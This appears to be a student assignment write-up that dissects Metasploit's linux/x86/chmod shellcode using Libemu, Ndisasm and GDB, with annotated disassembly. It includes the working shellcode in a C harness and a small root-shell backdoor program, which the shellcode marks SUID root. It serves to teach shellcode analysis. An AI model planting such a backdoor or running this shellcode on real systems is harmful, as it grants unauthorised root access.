[+]
 |
 +- Assignment 5: Metasploit Chmod 
 |_____________________________________________________________________________________


First, we try to emulate the shellcode using Libemu.

 	msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 R | sctest -Svvvs 100000000000


Libemu fails to produce nicely structured output.

We proceed to disassembling raw shellcode with Ndisasm and analyzing it with the use of the 
the following C libraries:

	/usr/include/i386-linux-gnu/asm/unistd_32.h
	/usr/include/asm-generic/fcntl.h 

as well as the Intel Assembly Instruction Set manual:

	64-ia-32-architectures-software-developer-vol-2a-2b-instruction-set-a-z-manual.pdf


	msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 R | ndisasm -u -


Finally, we complement our analysis with an executable ELF file that we can run with GDB. 

Before the resulting Metasploit C code can be compiled, it needs to be edited to run the 
generated shellcode. Since the Chmod command alters permissions of a file, we would also 
like to compile a backdoor executable and set SUID and execute permissions for it. 

	vi a5-bash.c
	gcc a5-bash.c -o a5-bash
	chmod 444 a5-bash
	ls -la a5-bash
		-r--r--r-- 1 root root 5188 May 22 17:57 a5-bash

	msfpayload linux/x86/chmod FILE=a5-bash MODE=4755 C > a5-msf_chmod.c
	vi a5-msf_chmod.c
	gcc a5-msf_chmod.c -o a5-msf_chmod -fno-stack-protector -z execstack
	gdb a5-msf_chmod
	ls -la a5-bash
		-rwsr-xr-x 1 root root 5188 May 22 17:57 a5-bash




[+]
 |
 +- a5-bash.c:
 |_____________________________________________________________________________________

#include <stdlib.h>
void main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}




[+]
 |
 +- a5-msf_chmod.c:
 |_____________________________________________________________________________________

#include<stdio.h>
#include<string.h>
/*
 * linux/x86/chmod - 32 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, FILE=a5-bash, MODE=4755
 */
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x08\x00\x00\x00\x61\x35\x2d\x62\x61"
"\x73\x68\x00\x5b\x68\xed\x09\x00\x00\x59\xcd\x80\x6a\x01\x58"
"\xcd\x80";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}




[+]
 |
 +- Ndisasm + GDB analysis:
 +- 	Comments are added as part of the analysis.
 |_____________________________________________________________________________________


00000000  99                cdq							; edx = 0
00000001  6A0F              push byte +0xf				; #define __NR_chmod 15
00000003  58                pop eax 					; eax = int chmod(const char *path, mode_t mode);
00000004  52                push edx 					; put NULL dword on the stack

														; from here on, GDB was used to understand the code

00000005  E808000000        call dword 0x12 			; put PAYLOAD address on the stack
 |
 +->00000012	0x08049772 <code+18>:	pop    ebx 					; ebx = EIP return address [PAYLOAD @ 0000000A] (path)
	00000013	0x08049773 <code+19>:	push   0x9ed 				; put 4755 (octal) on the stack
	00000018	0x08049778 <code+24>:	pop    ecx 					; ecx = 4755 (mode)
	00000019	0x08049779 <code+25>:	int    0x80 				; chmod 4755 a5-bash
	0000001B	0x0804977b <code+27>:	push   0x1 					; #define __NR_exit 1
	0000001D	0x0804977d <code+29>:	pop    eax 					; eax = void exit(int status);
	0000001E	0x0804977e <code+30>:	int    0x80 				; exit
				0x08049780 <code+32>:	add    BYTE PTR [eax],al 	; this does not get executed

   														; PAYLOAD = a5-bash
0000000A  61                popad
0000000B  352D626173        xor eax,0x7361622d
00000010  68005B68ED        push dword 0xed685b00
														; chmod 4755 a5-bash
00000015  0900              or [eax],eax
00000017  0059CD            add [ecx-0x33],bl
0000001A  806A0158          sub byte [edx+0x1],0x58
0000001E  CD80              int 0x80




[+]
 |
 +- GDB output:
 |_____________________________________________________________________________________


gdb$ b *&code
Breakpoint 1 at 0x8049760

gdb$ run

gdb$ pdisass 
Dump of assembler code for function code:
=> 0x08049760 <+0>:	cdq    
   0x08049761 <+1>:	push   0xf
   0x08049763 <+3>:	pop    eax
   0x08049764 <+4>:	push   edx
   0x08049765 <+5>:	call   0x8049772 <code+18>				; shifted code, disassemble this function
   0x0804976a <+10>:	popa   
   0x0804976b <+11>:	xor    eax,0x7361622d
   0x08049770 <+16>:	push   0xed685b00
   0x08049775 <+21>:	or     DWORD PTR [eax],eax
   0x08049777 <+23>:	add    BYTE PTR [ecx-0x33],bl
   0x0804977a <+26>:	sub    BYTE PTR [edx+0x1],0x58
   0x0804977e <+30>:	int    0x80
   0x08049780 <+32>:	add    BYTE PTR [eax],al
End of assembler dump.


gdb$ pdisass 0x8049772 <code+18>
Dump of assembler code from 0x8049772 to 0x8049792:
   0x08049772 <code+18>:	pop    ebx
   0x08049773 <code+19>:	push   0x9ed
   0x08049778 <code+24>:	pop    ecx
   0x08049779 <code+25>:	int    0x80
   0x0804977b <code+27>:	push   0x1
   0x0804977d <code+29>:	pop    eax
   0x0804977e <code+30>:	int    0x80
   0x08049780 <code+32>:	add    BYTE PTR [eax],al



[+]
 |
 +- Discussion & Conclusions:
 |_____________________________________________________________________________________

Undestanding this shellcode had several seemingly tricky parts, but with the use of GDB
we were able to trace the execution flow and relate it back to Ndisasm output.

This shellcode uses the CALL instruction to put the payload address on the stack. The
payload in this case is the file name that is to be chmod'ed, which in this particular 
case is a5-bash. Finally, the program executes the chmod call on a5-bash with 4755 as
permissions, thereby making the file a SUID executable.
